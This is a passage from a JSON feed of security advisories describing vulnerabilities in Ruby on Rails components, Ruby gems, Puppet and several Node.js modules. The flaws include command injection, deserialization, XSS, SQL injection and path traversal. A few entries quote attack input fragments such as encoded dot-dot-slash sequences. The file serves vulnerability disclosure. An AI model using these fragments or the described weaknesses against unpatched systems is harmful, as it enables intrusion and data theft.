    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "ActiveRecord in Ruby on Rails before 2.3.17, 3.1.x before 3.1.11, and 3.2.x before 3.2.12 allows remote attackers to bypass the attr_protected protection mechanism and modify protected model attributes via a crafted request.",
    "summary": "Moderate severity vulnerability that affects activerecord"
  },
  {
    "ghsaId": "GHSA-fhj9-cjjh-27vm",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "ActiveRecord in Ruby on Rails before 2.3.17 and 3.x before 3.1.0 allows remote attackers to cause a denial of service or execute arbitrary code via crafted serialized attributes that cause the +serialize+ helper to deserialize arbitrary YAML.",
    "summary": "Critical severity vulnerability that affects activerecord"
  },
  {
    "ghsaId": "GHSA-q6cw-2553-7837",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "Ruby agent 3.2.0 through 3.5.2 serializes sensitive data when communicating with servers operated by New Relic, which allows remote attackers to obtain sensitive information (database credentials and SQL statements) by sniffing the network and deserializing the data.",
    "summary": "Moderate severity vulnerability that affects newrelic_rpm"
  },
  {
    "ghsaId": "GHSA-4936-rj25-6wm6",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "The nori gem 2.0.x before 2.0.2, 1.1.x before 1.1.4, and 1.0.x before 1.0.3 for Ruby does not properly restrict casts of string values, which allows remote attackers to conduct object-injection attacks and execute arbitrary code, or cause a denial of service (memory and CPU consumption) involving nested XML entity references, by leveraging Action Pack support for (1) YAML type conversion or (2) Symbol type conversion, a similar vulnerability to CVE-2013-0156.",
    "summary": "High severity vulnerability that affects nori"
  },
  {
    "ghsaId": "GHSA-xgr2-v94m-rc9g",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "lib/active_support/json/backends/yaml.rb in Ruby on Rails 2.3.x before 2.3.16 and 3.0.x before 3.0.20 does not properly convert JSON data to YAML data for processing by a YAML parser, which allows remote attackers to execute arbitrary code, conduct SQL injection attacks, or bypass authentication via crafted data that triggers unsafe decoding, a different vulnerability than CVE-2013-0156.",
    "summary": "High severity vulnerability that affects activesupport"
  },
  {
    "ghsaId": "GHSA-574q-fxfj-wv6h",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "Puppet 2.7.x before 2.7.21 and 3.1.x before 3.1.1, when running Ruby 1.9.3 or later, allows remote attackers to execute arbitrary code via vectors related to \"serialized attributes.\"",
    "summary": "High severity vulnerability that affects puppet"
  },
  {
    "ghsaId": "GHSA-jxx8-v83v-rhw3",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "Spree Commerce 1.0.x through 1.3.2 allows remote authenticated administrators to instantiate arbitrary Ruby objects and execute arbitrary commands via the (1) payment_method parameter to core/app/controllers/spree/admin/payment_methods_controller.rb; and the (2) promotion_action parameter to promotion_actions_controller.rb, (3) promotion_rule parameter to promotion_rules_controller.rb, and (4) calculator_type parameter to promotions_controller.rb in promo/app/controllers/spree/admin/, related to unsafe use of the constantize function.",
    "summary": "Moderate severity vulnerability that affects spree"
  },
  {
    "ghsaId": "GHSA-p463-639r-q9g9",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "The Dragonfly gem 0.7 before 0.8.6 and 0.9.x before 0.9.13 for Ruby, when used with Ruby on Rails, allows remote attackers to execute arbitrary code via a crafted request.",
    "summary": "High severity vulnerability that affects dragonfly"
  },
  {
    "ghsaId": "GHSA-m7fq-cf8q-35q7",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "The crack gem 0.3.1 and earlier for Ruby does not properly restrict casts of string values, which might allow remote attackers to conduct object-injection attacks and execute arbitrary code, or cause a denial of service (memory and CPU consumption) by leveraging Action Pack support for (1) YAML type conversion or (2) Symbol type conversion, a similar vulnerability to CVE-2013-0156.",
    "summary": "High severity vulnerability that affects crack"
  },
  {
    "ghsaId": "GHSA-mgx3-27hr-mfgp",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "The httparty gem 0.9.0 and earlier for Ruby does not properly restrict casts of string values, which might allow remote attackers to conduct object-injection attacks and execute arbitrary code, or cause a denial of service (memory and CPU consumption) by leveraging Action Pack support for YAML type conversion, a similar vulnerability to CVE-2013-0156.",
    "summary": "High severity vulnerability that affects httparty"
  },
  {
    "ghsaId": "GHSA-9h36-4jf2-hx53",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "The extlib gem 0.9.15 and earlier for Ruby does not properly restrict casts of string values, which might allow remote attackers to conduct object-injection attacks and execute arbitrary code, or cause a denial of service (memory and CPU consumption) by leveraging Action Pack support for (1) YAML type conversion or (2) Symbol type conversion, a similar vulnerability to CVE-2013-0156.",
    "summary": "High severity vulnerability that affects extlib"
  },
  {
    "ghsaId": "GHSA-6c8p-qphv-668v",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "The ruby-openid gem before 2.2.2 for Ruby allows remote OpenID providers to cause a denial of service (CPU consumption) via (1) a large XRDS document or (2) an XML Entity Expansion (XEE) attack.",
    "summary": "Moderate severity vulnerability that affects ruby-openid"
  },
  {
    "ghsaId": "GHSA-3crr-9vmg-864v",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "The Active Record component in Ruby on Rails 2.3.x before 2.3.18, 3.1.x before 3.1.12, and 3.2.x before 3.2.13 processes certain queries by converting hash keys to symbols, which allows remote attackers to cause a denial of service via crafted input to a where method.",
    "summary": "Moderate severity vulnerability that affects activerecord"
  },
  {
    "ghsaId": "GHSA-q759-hwvc-m3jg",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "The sanitize_css method in lib/action_controller/vendor/html-scanner/html/sanitizer.rb in the Action Pack component in Ruby on Rails before 2.3.18, 3.0.x and 3.1.x before 3.1.12, and 3.2.x before 3.2.13 does not properly handle \\n (newline) characters, which makes it easier for remote attackers to conduct cross-site scripting (XSS) attacks via crafted Cascading Style Sheets (CSS) token sequences.",
    "summary": "Moderate severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-9c2j-593q-3g82",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "The ActiveSupport::XmlMini_JDOM backend in lib/active_support/xml_mini/jdom.rb in the Active Support component in Ruby on Rails 3.0.x and 3.1.x before 3.1.12 and 3.2.x before 3.2.13, when JRuby is used, does not properly restrict the capabilities of the XML parser, which allows remote attackers to read arbitrary files or cause a denial of service (resource consumption) via vectors involving (1) an external DTD or (2) an external entity declaration in conjunction with an entity reference.",
    "summary": "Moderate severity vulnerability that affects activesupport"
  },
  {
    "ghsaId": "GHSA-j838-vfpq-fmf2",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "The sanitize helper in lib/action_controller/vendor/html-scanner/html/sanitizer.rb in the Action Pack component in Ruby on Rails before 2.3.18, 3.0.x and 3.1.x before 3.1.12, and 3.2.x before 3.2.13 does not properly handle encoded : (colon) characters in URLs, which makes it easier for remote attackers to conduct cross-site scripting (XSS) attacks via a crafted scheme name, as demonstrated by including a &#x3a; sequence.",
    "summary": "Moderate severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-p673-hjf2-pwfr",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "command_wrap.rb in the command_wrap Gem for Ruby allows remote attackers to execute arbitrary commands via shell metacharacters in a URL or filename.",
    "summary": "High severity vulnerability that affects command_wrap"
  },
  {
    "ghsaId": "GHSA-7fqj-cg79-f2pv",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "lib/thumbshooter.rb in the Thumbshooter 0.1.5 gem for Ruby allows remote attackers to execute arbitrary commands via shell metacharacters in a URL.",
    "summary": "High severity vulnerability that affects thumbshooter"
  },
  {
    "ghsaId": "GHSA-g266-3crh-h7gj",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "lib/ldoce/word.rb in the ldoce 0.0.2 gem for Ruby allows remote attackers to execute arbitrary commands via shell metacharacters in (1) an mp3 URL or (2) file name.",
    "summary": "Moderate severity vulnerability that affects ldoce"
  },
  {
    "ghsaId": "GHSA-78j3-7wpm-qhvp",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "kelredd-pruview gem 0.3.8 for Ruby allows context-dependent attackers to execute arbitrary commands via shell metacharacters in a filename argument to (1) document.rb, (2) video.rb, or (3) video_image.rb.",
    "summary": "Critical severity vulnerability that affects kelredd-pruview"
  },
  {
    "ghsaId": "GHSA-99ch-8mvp-g7m5",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "converter.rb in the md2pdf gem 0.0.1 for Ruby allows context-dependent attackers to execute arbitrary commands via shell metacharacters in a filename.",
    "summary": "Critical severity vulnerability that affects md2pdf"
  },
  {
    "ghsaId": "GHSA-m6f7-46hw-grcj",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "The set_meta_data function in lib/cremefraiche.rb in the Creme Fraiche gem before 0.6.1 for Ruby allows remote attackers to execute arbitrary commands via shell metacharacters in the file name of an email attachment.  NOTE: some of these details are obtained from third party information.",
    "summary": "Critical severity vulnerability that affects cremefraiche"
  },
  {
    "ghsaId": "GHSA-9hx9-w2j6-rw76",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "The Show In Browser (show_in_browser) gem 0.0.3 for Ruby allows local users to inject arbitrary web script or HTML via a symlink attack on /tmp/browser.html.",
    "summary": "Low severity vulnerability that affects show_in_browser"
  },
  {
    "ghsaId": "GHSA-9qj7-jvg4-qr2x",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "Phusion Passenger gem before 3.0.21 and 4.0.x before 4.0.5 for Ruby allows local users to cause a denial of service (prevent application start) or gain privileges by pre-creating a temporary \"config\" file in a directory with a predictable name in /tmp/ before it is used by the gem.",
    "summary": "Moderate severity vulnerability that affects passenger"
  },
  {
    "ghsaId": "GHSA-w248-xr37-jx8m",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "lib/entry_controller.rb in the fastreader Gem 1.0.8 for Ruby allows remote attackers to execute arbitrary commands via shell metacharacters in a URL.",
    "summary": "High severity vulnerability that affects fastreader"
  },
  {
    "ghsaId": "GHSA-w754-gq8r-pf5f",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "lib/mini_magick.rb in the MiniMagick Gem 1.3.1 for Ruby allows remote attackers to execute arbitrary commands via shell metacharacters in a URL.",
    "summary": "High severity vulnerability that affects mini_magick"
  },
  {
    "ghsaId": "GHSA-hxx6-p24v-wg8c",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "lib/curl.rb in the Curl Gem for Ruby allows remote attackers to execute arbitrary commands via shell metacharacters in a URL.",
    "summary": "High severity vulnerability that affects curl"
  },
  {
    "ghsaId": "GHSA-f7p5-w2cr-7cp7",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "Puppet 2.7.x before 2.7.22 and 3.2.x before 3.2.2, and Puppet Enterprise before 2.8.2, deserializes untrusted YAML, which allows remote attackers to instantiate arbitrary Ruby classes and execute arbitrary code via a crafted REST API call.",
    "summary": "High severity vulnerability that affects puppet"
  },
  {
    "ghsaId": "GHSA-w6rc-q387-vpgq",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "ext/common/ServerInstanceDir.h in Phusion Passenger gem before 4.0.6 for Ruby allows local users to gain privileges or possibly change the ownership of arbitrary directories via a symlink attack on a directory with a predictable name in /tmp/.",
    "summary": "Moderate severity vulnerability that affects passenger"
  },
  {
    "ghsaId": "GHSA-jg4m-q6w8-vrjp",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "The self.run_gpg function in lib/rgpg/gpg_helper.rb in the rgpg gem before 0.2.3 for Ruby allows remote attackers to execute arbitrary commands via shell metacharacters in unspecified vectors.",
    "summary": "High severity vulnerability that affects rgpg"
  },
  {
    "ghsaId": "GHSA-rg5m-3fqp-6px8",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "Multiple format string vulnerabilities in log_subscriber.rb files in the log subscriber component in Action Mailer in Ruby on Rails 3.x before 3.2.15 allow remote attackers to cause a denial of service via a crafted e-mail address that is improperly handled during construction of a log message.",
    "summary": "Moderate severity vulnerability that affects actionmailer"
  },
  {
    "ghsaId": "GHSA-rprj-g6xc-p5gq",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "Directory traversal vulnerability in controller/concerns/render_redirect.rb in the Wicked gem before 1.0.1 for Ruby allows remote attackers to read arbitrary files via a %2E%2E%2F (encoded dot dot slash) in the step.",
    "summary": "Moderate severity vulnerability that affects wicked"
  },
  {
    "ghsaId": "GHSA-c43v-hrmg-56r4",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "The Cocaine gem 0.4.0 through 0.5.2 for Ruby allows context-dependent attackers to execute arbitrary commands via a crafted has object, related to recursive variable interpolation.",
    "summary": "Moderate severity vulnerability that affects cocaine"
  },
  {
    "ghsaId": "GHSA-699m-mcjm-9cw8",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "Cross-site scripting (XSS) vulnerability in actionpack/lib/action_view/helpers/translation_helper.rb in the internationalization component in Ruby on Rails 3.x before 3.2.16 and 4.x before 4.0.2 allows remote attackers to inject arbitrary web script or HTML via a crafted string that triggers generation of a fallback string by the i18n gem.",
    "summary": "Moderate severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-r5hc-9xx5-97rw",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "Cross-site scripting (XSS) vulnerability in exceptions.rb in the i18n gem before 0.6.6 for Ruby allows remote attackers to inject arbitrary web script or HTML via a crafted I18n::MissingTranslationData.new call.",
    "summary": "Moderate severity vulnerability that affects i18n"
  },
  {
    "ghsaId": "GHSA-cf36-985g-v73c",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "The omniauth-facebook gem 1.4.1 before 1.5.0 does not properly store the session parameter, which allows remote attackers to conduct cross-site request forgery (CSRF) attacks via the state parameter.",
    "summary": "Moderate severity vulnerability that affects omniauth-facebook"
  },
  {
    "ghsaId": "GHSA-xxvw-45rp-3mj2",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "The JS-YAML module before 2.0.5 for Node.js parses input without properly considering the unsafe !!js/function tag, which allows remote attackers to execute arbitrary code via a crafted string that triggers an eval operation.",
    "summary": "Moderate severity vulnerability that affects js-yaml"
  },
  {
    "ghsaId": "GHSA-cj43-9h3w-v976",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "Unspecified vulnerability in Puppet 2.7.x before 2.7.23 and 3.2.x before 3.2.4, and Puppet Enterprise 2.8.x before 2.8.3 and 3.0.x before 3.0.1, allows remote attackers to execute arbitrary Ruby programs from the master via the resource_type service.  NOTE: this vulnerability can only be exploited utilizing unspecified \"local file system access\" to the Puppet Master.",
    "summary": "Moderate severity vulnerability that affects puppet"
  },
  {
    "ghsaId": "GHSA-rfmf-rx8w-935w",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "lib/sounder/sound.rb in the sounder gem 1.0.1 for Ruby allows remote attackers to execute arbitrary commands via shell metacharacters in a filename.",
    "summary": "High severity vulnerability that affects sounder"
  },
  {
    "ghsaId": "GHSA-qrgf-jqqm-x7xv",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "lib/dragonfly/imagemagickutils.rb in the fog-dragonfly gem 0.8.2 for Ruby allows remote attackers to execute arbitrary commands via unspecified vectors.",
    "summary": "High severity vulnerability that affects dragonfly"
  },
  {
    "ghsaId": "GHSA-mpxf-gcw2-pw5q",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "actionpack/lib/action_view/lookup_context.rb in Action View in Ruby on Rails 3.x before 3.2.16 and 4.x before 4.0.2 allows remote attackers to cause a denial of service (memory consumption) via a header containing an invalid MIME type that leads to excessive caching.",
    "summary": "Moderate severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-6h5q-96hp-9jgm",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "Cross-site scripting (XSS) vulnerability in the number_to_currency helper in actionpack/lib/action_view/helpers/number_helper.rb in Ruby on Rails before 3.2.16 and 4.x before 4.0.2 allows remote attackers to inject arbitrary web script or HTML via the unit parameter.",
    "summary": "Moderate severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-w37c-q653-qg95",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "Cross-site scripting (XSS) vulnerability in the simple_format helper in actionpack/lib/action_view/helpers/text_helper.rb in Ruby on Rails 4.x before 4.0.2 allows remote attackers to inject arbitrary web script or HTML via a crafted HTML attribute.",
    "summary": "Moderate severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-wpw7-wxjm-cw8r",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "actionpack/lib/action_dispatch/http/request.rb in Ruby on Rails before 3.2.16 and 4.x before 4.0.2 does not properly consider differences in parameter handling between the Active Record component and the JSON implementation, which allows remote attackers to bypass intended database-query restrictions and perform NULL checks or trigger missing WHERE clauses via a crafted request that leverages (1) third-party Rack middleware or (2) custom Rack middleware.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2013-0155.",
    "summary": "Moderate severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-229r-pqp6-8w6g",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "The unpack_zip function in archive_unpacker.rb in the sprout gem 0.7.246 for Ruby allows context-dependent attackers to execute arbitrary commands via shell metacharacters in a (1) filename or (2) path.",
    "summary": "High severity vulnerability that affects sprout"
  },
  {
    "ghsaId": "GHSA-8r6h-7x9g-xmw9",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "Cross-site scripting (XSS) vulnerability in the will_paginate gem before 3.0.5 for Ruby allows remote attackers to inject arbitrary web script or HTML via vectors involving generated pagination links.",
    "summary": "Moderate severity vulnerability that affects will_paginate"
  },
  {
    "ghsaId": "GHSA-p65m-qr5x-rrqq",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "The message function in lib/webbynode/notify.rb in the Webbynode gem 1.0.5.3 and earlier for Ruby allows context-dependent attackers to execute arbitrary commands via shell metacharacters in a growlnotify message.",
    "summary": "High severity vulnerability that affects webbynode"
  },
  {
    "ghsaId": "GHSA-xwr3-fmgj-mmfr",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "The put_call function in the API client (api/api_client.rb) in the BaseSpace Ruby SDK (aka bio-basespace-sdk) gem 0.1.7 for Ruby uses the API_KEY on the command line, which allows remote attackers to obtain sensitive information by listing the processes.",
    "summary": "Moderate severity vulnerability that affects bio-basespace-sdk"
  },
  {
    "ghsaId": "GHSA-qpjp-7rp2-9c3f",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "The validator module before 1.1.0 for Node.js allows remote attackers to bypass the XSS filter via a nested tag.",
    "summary": "Moderate severity vulnerability that affects validator"
  },
  {
    "ghsaId": "GHSA-rh6c-q938-3r9q",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "The validator module before 1.1.0 for Node.js allows remote attackers to bypass the cross-site scripting (XSS) filter via a crafted javascript URI.",
    "summary": "Moderate severity vulnerability that affects validator"
  },
  {
    "ghsaId": "GHSA-552w-rqg8-gxxm",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "The validator module before 1.1.0 for Node.js allows remote attackers to bypass the cross-site scripting (XSS) filter via vectors related to UI redressing.",
    "summary": "Moderate severity vulnerability that affects validator"
  },
  {
    "ghsaId": "GHSA-q4qq-fm7q-cwp5",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "The validator module before 1.1.0 for Node.js allows remote attackers to bypass the cross-site scripting (XSS) filter via nested forbidden strings.",
    "summary": "Moderate severity vulnerability that affects validator"
  },
  {
    "ghsaId": "GHSA-4c4w-3q45-hp9j",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "The aescrypt gem 1.0.0 for Ruby does not randomize the CBC IV for use with the AESCrypt.encrypt and AESCrypt.decrypt functions, which allows attackers to defeat cryptographic protection mechanisms via a chosen plaintext attack.",
    "summary": "Moderate severity vulnerability that affects aescrypt"
  },
  {
    "ghsaId": "GHSA-ww79-8xwv-932x",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "The rbovirt gem before 0.0.24 for Ruby uses the rest-client gem with SSL verification disabled, which allows remote attackers to conduct man-in-the-middle attacks via unspecified vectors.",
    "summary": "Moderate severity vulnerability that affects rbovirt"
  },
  {
    "ghsaId": "GHSA-hqf9-rc9j-5fmj",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "SQL injection vulnerability in activerecord/lib/active_record/connection_adapters/postgresql/cast.rb in Active Record in Ruby on Rails 4.0.x before 4.0.3, and 4.1.0.beta1, when PostgreSQL is used, allows remote attackers to execute \"add data\" SQL commands via vectors involving \\ (backslash) characters that are not properly handled in operations on array columns.",
    "summary": "Moderate severity vulnerability that affects activerecord"
  },
  {
    "ghsaId": "GHSA-m46p-ggm5-5j83",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "Multiple cross-site scripting (XSS) vulnerabilities in actionview/lib/action_view/helpers/number_helper.rb in Ruby on Rails before 3.2.17, 4.0.x before 4.0.3, and 4.1.x before 4.1.0.beta2 allow remote attackers to inject arbitrary web script or HTML via the (1) format, (2) negative_format, or (3) units parameter to the (a) number_to_currency, (b) number_to_percentage, or (c) number_to_human helper.",
    "summary": "Moderate severity vulnerability that affects rails"
  },
  {
    "ghsaId": "GHSA-7cgp-c3g7-qvrw",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "actionpack/lib/action_view/template/text.rb in Action View in Ruby on Rails 3.x before 3.2.17 converts MIME type strings to symbols during use of the :text option to the render method, which allows remote attackers to cause a denial of service (memory consumption) by including these strings in headers.",
    "summary": "Moderate severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-6x85-j5j2-27jx",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "Directory traversal vulnerability in actionpack/lib/abstract_controller/base.rb in the implicit-render implementation in Ruby on Rails before 3.2.18, 4.0.x before 4.0.5, and 4.1.x before 4.1.1, when certain route globbing configurations are enabled, allows remote attackers to read arbitrary files via a crafted request.",
    "summary": "Moderate severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-fqrr-rrwg-69pv",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "The paratrooper-pingdom gem 1.0.0 for Ruby allows local users to obtain the App-Key, username, and password values by listing the curl process.",
    "summary": "Low severity vulnerability that affects paratrooper-pingdom"
  },
  {
    "ghsaId": "GHSA-959j-5g9v-3fpq",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "The paratrooper-newrelic gem 1.0.1 for Ruby allows local users to obtain the X-Api-Key value by listing the curl process.",
    "summary": "Low severity vulnerability that affects paratrooper-newrelic"
  },
  {
    "ghsaId": "GHSA-hgmw-x865-hf9x",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "lib/string_utf_support.rb in the Arabic Prawn 0.0.1 gem for Ruby allows remote attackers to execute arbitrary commands via shell metacharacters in the (1) downloaded_file or (2) url variable.",
    "summary": "High severity vulnerability that affects arabic-prawn"
  },
  {
    "ghsaId": "GHSA-v3rr-cph9-2g2q",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "Cross-site scripting (XSS) vulnerability in lib/rack/ssl.rb in the rack-ssl gem before 1.4.0 for Ruby allows remote attackers to inject arbitrary web script or HTML via a URI, which might not be properly handled by third-party adapters such as JRuby-Rack.",
    "summary": "Moderate severity vulnerability that affects rack-ssl"
  },
  {
    "ghsaId": "GHSA-vm28-mrm7-fpjq",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "lib/sfpagent/bsig.rb in the sfpagent gem before 0.4.15 for Ruby allows remote attackers to execute arbitrary commands via shell metacharacters in the module name in a JSON request.",
    "summary": "High severity vulnerability that affects sfpagent"
  },
  {
    "ghsaId": "GHSA-92v7-pq4h-58j5",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "Untrusted search path vulnerability in Puppet Enterprise 2.8 before 2.8.7, Puppet before 2.7.26 and 3.x before 3.6.2, Facter 1.6.x and 2.x before 2.0.2, Hiera before 1.3.4, and Mcollective before 2.5.2, when running with Ruby 1.9.1 or earlier, allows local users to gain privileges via a Trojan horse file in the current working directory, as demonstrated using (1) rubygems/defaults/operating_system.rb, (2) Win32API.rb, (3) Win32API.so, (4) safe_yaml.rb, (5) safe_yaml/deep.rb, or (6) safe_yaml/deep.so; or (7) operatingsystem.rb, (8) operatingsystem.so, (9) osfamily.rb, or (10) osfamily.so in puppet/confine.",
    "summary": "Moderate severity vulnerability that affects facter, hiera, mcollective-client, and puppet"
  },
  {
    "ghsaId": "GHSA-mhwp-qhpc-h3jm",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "SQL injection vulnerability in activerecord/lib/active_record/connection_adapters/postgresql_adapter.rb in the PostgreSQL adapter for Active Record in Ruby on Rails 2.x and 3.x before 3.2.19 allows remote attackers to execute arbitrary SQL commands by leveraging improper bitstring quoting.",
    "summary": "High severity vulnerability that affects activerecord"
  },
  {
    "ghsaId": "GHSA-r8fh-hq2p-7qhq",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "SQL injection vulnerability in activerecord/lib/active_record/connection_adapters/postgresql/quoting.rb in the PostgreSQL adapter for Active Record in Ruby on Rails 4.x before 4.0.7 and 4.1.x before 4.1.3 allows remote attackers to execute arbitrary SQL commands by leveraging improper range quoting.",
    "summary": "High severity vulnerability that affects activerecord"
  },
  {
    "ghsaId": "GHSA-9rf5-jm6f-2fmm",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "activerecord/lib/active_record/relation/query_methods.rb in Active Record in Ruby on Rails 4.0.x before 4.0.9 and 4.1.x before 4.1.5 allows remote attackers to bypass the strong parameters protection mechanism via crafted input to an application that makes create_with calls.",
    "summary": "High severity vulnerability that affects activerecord"
  },
  {
    "ghsaId": "GHSA-cqr7-78pj-3g7j",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "The hapi server framework 2.0.x and 2.1.x before 2.2.0 for Node.js allows remote attackers to cause a denial of service (file descriptor consumption and process crash) via unspecified vectors.",
    "summary": "Moderate severity vulnerability that affects hapi"
  },
  {
    "ghsaId": "GHSA-xwg4-93c6-3h42",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "visionmedia send before 0.8.4 for Node.js uses a partial comparison for verifying whether a directory is within the document root, which allows remote attackers to access restricted directories, as demonstrated using \"public-restricted\" under a \"public\" directory.",
    "summary": "High severity vulnerability that affects send"
  },
  {
    "ghsaId": "GHSA-jjv7-qpx3-h62q",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "The qs module before 1.0.0 in Node.js does not call the compact function for array data, which allows remote attackers to cause a denial of service (memory consumption) by using a large index value to create a sparse array.",
    "summary": "Moderate severity vulnerability that affects qs"
  },
  {
    "ghsaId": "GHSA-5726-g6r9-5f22",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "Eval injection vulnerability in index.js in the syntax-error package before 1.1.1 for Node.js 0.10.x, as used in IBM Rational Application Developer and other products, allows remote attackers to execute arbitrary code via a crafted file.",
    "summary": "Critical severity vulnerability that affects syntax-error"
  },
  {
    "ghsaId": "GHSA-84fq-6626-w5fg",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "The Crumb plugin before 3.0.0 for Node.js does not properly restrict token access in situations where a hapi route handler has CORS enabled, which allows remote attackers to obtain sensitive information, and potentially obtain the ability to spoof requests to non-CORS routes, via a crafted web site that is visited by an application consumer.",
    "summary": "Moderate severity vulnerability that affects crumb"
  },
  {
    "ghsaId": "GHSA-5j3g-jfq3-7jwx",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "Eval injection vulnerability in the internals.batch function in lib/batch.js in the bassmaster plugin before 1.5.2 for the hapi server framework for Node.js allows remote attackers to execute arbitrary Javascript code via unspecified vectors.",
    "summary": "Critical severity vulnerability that affects bassmaster"
  },
  {
    "ghsaId": "GHSA-29gr-w57f-rpfw",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "Directory traversal vulnerability in actionpack/lib/action_dispatch/middleware/static.rb in Action Pack in Ruby on Rails 3.x before 3.2.20, 4.0.x before 4.0.11, 4.1.x before 4.1.7, and 4.2.x before 4.2.0.beta3, when serve_static_assets is enabled, allows remote attackers to determine the existence of files outside the application root via a /..%2F sequence.",
    "summary": "Moderate severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-33pp-3763-mrfp",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "Multiple directory traversal vulnerabilities in server.rb in Sprockets before 2.0.5, 2.1.x before 2.1.4, 2.2.x before 2.2.3, 2.3.x before 2.3.3, 2.4.x before 2.4.6, 2.5.x before 2.5.1, 2.6.x and 2.7.x before 2.7.1, 2.8.x before 2.8.3, 2.9.x before 2.9.4, 2.10.x before 2.10.2, 2.11.x before 2.11.3, 2.12.x before 2.12.3, and 3.x before 3.0.0.beta.3, as distributed with Ruby on Rails 3.x and 4.x, allow remote attackers to determine the existence of files outside the application root via a ../ (dot dot slash) sequence with (1) double slashes or (2) URL encoding.",
    "summary": "Moderate severity vulnerability that affects sprockets"
  },
  {
    "ghsaId": "GHSA-h56m-vwxc-3qpw",
    "publishedAt": "2017-10-24T18:33:36Z",
    "description": "Directory traversal vulnerability in actionpack/lib/action_dispatch/middleware/static.rb in Action Pack in Ruby on Rails 3.x before 3.2.21, 4.0.x before 4.0.12, 4.1.x before 4.1.8, and 4.2.x before 4.2.0.beta4, when serve_static_assets is enabled, allows remote attackers to determine the existence of files outside the application root via vectors involving a \\ (backslash) character, a similar issue to CVE-2014-7818.",
    "summary": "Moderate severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-c9c5-9fpr-m882",
    "publishedAt": "2017-10-24T18:33:36Z",
